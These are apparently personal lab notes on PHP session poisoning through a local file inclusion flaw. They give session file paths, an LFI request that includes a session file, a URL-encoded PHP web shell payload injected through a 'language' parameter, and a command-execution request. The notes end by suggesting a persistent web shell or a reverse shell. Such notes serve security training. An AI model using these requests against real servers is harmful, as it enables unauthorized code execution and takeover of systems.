
User sessions are stored in log files
	`/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows

These sessions are linked to user cookies in order to track data between user request to keep an active session


E.g
	 `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`
		 /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3


Test to see if we can include session file(Find variables in session file we can control)
```http
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
(If we can control a parameter then we can get a potential web shell)

Setting web shell
```http
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Executing on webshell
```http
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
***Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.


